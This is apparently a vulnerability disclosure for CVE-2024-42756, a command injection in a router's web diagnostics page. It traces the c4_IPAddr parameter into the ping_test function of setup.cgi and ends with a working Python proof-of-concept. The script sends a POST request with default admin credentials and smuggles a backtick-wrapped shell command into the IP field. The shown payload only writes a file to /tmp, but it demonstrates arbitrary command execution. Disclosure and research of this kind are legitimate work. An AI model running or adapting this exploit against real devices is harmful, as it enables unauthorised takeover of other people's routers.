## Command injection exists on the Diagnostics page of web
## ![1721830818130.png](https://cdn.nlark.com/yuque/0/2024/png/43672949/1721830823860-f5b57545-c9d4-455a-9471-c041145deb90.png#averageHue=%23fbfafa&clientId=u2f508ae5-ad4e-4&from=paste&height=667&id=u6ad3a6b3&originHeight=817&originWidth=1959&originalType=binary&ratio=1.2244897959183674&rotation=0&showTitle=false&size=178745&status=done&style=none&taskId=u2dc9df19-997d-4ab1-8f0f-59567da8a1d&title=&width=1599.85)Parameters discovered by capturing packets are passed as c4_IPAddr
![1721830893722.png](https://cdn.nlark.com/yuque/0/2024/png/43672949/1721830898585-93b51d16-5c9b-43cd-8c62-e6760b1bfc30.png#averageHue=%23f6f5f4&clientId=u2f508ae5-ad4e-4&from=paste&height=481&id=u9a9dc098&originHeight=589&originWidth=1511&originalType=binary&ratio=1.2244897959183674&rotation=0&showTitle=false&size=180889&status=done&style=none&taskId=u191977f1-3747-4a61-bd28-5b554321602&title=&width=1233.9833333333333)
## grep -r "c4_IPAddr"
## The string c4_IPAddr was found in the binary file setup.cgi
## ![1721830988983.png](https://cdn.nlark.com/yuque/0/2024/png/43672949/1721830993358-8ed1a10d-12ff-4ab6-980c-67520114154f.png#averageHue=%232f0b25&clientId=u2f508ae5-ad4e-4&from=paste&height=147&id=uc384f1dc&originHeight=180&originWidth=989&originalType=binary&ratio=1.2244897959183674&rotation=0&showTitle=false&size=54506&status=done&style=none&taskId=u7fd9f142-063c-4b91-9664-aa55c9febd3&title=&width=807.6833333333333)c4_IPAddr found in IDA
## ![图片.png](https://cdn.nlark.com/yuque/0/2024/png/43672949/1721831173391-424fccd7-17bf-4aa3-af43-c74c3ee326a7.png#averageHue=%23f6f4f2&clientId=u2f508ae5-ad4e-4&from=paste&height=81&id=u127d49b3&originHeight=99&originWidth=492&originalType=binary&ratio=1.2244897959183674&rotation=0&showTitle=false&size=7500&status=done&style=none&taskId=uadf28c54-c85f-487b-8f09-f0d4a58bc1a&title=&width=401.8)![图片.png](https://cdn.nlark.com/yuque/0/2024/png/43672949/1721831178917-d7207407-09fe-433a-8801-17e72bd999bb.png#averageHue=%23e1b872&clientId=u2f508ae5-ad4e-4&from=paste&height=245&id=u7b48214b&originHeight=300&originWidth=1074&originalType=binary&ratio=1.2244897959183674&rotation=0&showTitle=false&size=68847&status=done&style=none&taskId=ue6fadf4e-694e-480d-8a4d-bafb5175091&title=&width=877.1)Locate the ping_test function
## Found only filtered;
## ![图片.png](https://cdn.nlark.com/yuque/0/2024/png/43672949/1721831709526-010cc455-1465-4b99-9aaf-6c41f38ce04e.png#averageHue=%23fbf9f9&clientId=u2f508ae5-ad4e-4&from=paste&height=357&id=u048c6c59&originHeight=437&originWidth=723&originalType=binary&ratio=1.2244897959183674&rotation=0&showTitle=false&size=45688&status=done&style=none&taskId=uee7d6df5-a244-4082-8537-6bba71a4186&title=&width=590.4499999999999)
## Construct exp
## ![1721831347990.png](https://cdn.nlark.com/yuque/0/2024/png/43672949/1721831355775-8653b8c6-35bb-40e5-a7df-b4247154883b.png#averageHue=%23faf9f9&clientId=u2f508ae5-ad4e-4&from=paste&height=865&id=u13a39b91&originHeight=1059&originWidth=945&originalType=binary&ratio=1.2244897959183674&rotation=0&showTitle=false&size=135712&status=done&style=none&taskId=u53475e1f-a6b3-4cab-8158-c5002861fbb&title=&width=771.75)Description Directory nop was successfully written
## ![1721831375064.png](https://cdn.nlark.com/yuque/0/2024/png/43672949/1721831382760-a39f9648-4617-4181-bc1e-547f21f62775.png#averageHue=%232d0923&clientId=u2f508ae5-ad4e-4&from=paste&height=185&id=u11c37f75&originHeight=227&originWidth=670&originalType=binary&ratio=1.2244897959183674&rotation=0&showTitle=false&size=29346&status=done&style=none&taskId=u701b1eff-7b45-4d37-820e-d11399feb68&title=&width=547.1666666666666)
exp
import requests

burp0_url = "[http://192.168.0.1:80/setup.cgi"](http://192.168.0.1:80/setup.cgi")
burp0_headers = {"Cache-Control": "max-age=0", "Authorization": "Basic YWRtaW46cGFzc3dvcmQ=", "Upgrade-Insecure-Requests": "1", "Origin": "http://192.168.0.1", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "[http://192.168.0.1/diag.htm&todo=cfg_init",](http://192.168.0.1/diag.htm&todo=cfg_init",) "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
burp0_data = {"IPAddr1": "192", "IPAddr2": "168", "IPAddr3": "0", "IPAddr4": "2", "ping": "Ping", "todo": "ping_test", "this_file": "diag.htm", "next_file": "diagping.htm", "c4_IPAddr": "192.168.0.2`echo 2 > /tmp/nop`"}
requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
CVE-2024-42756
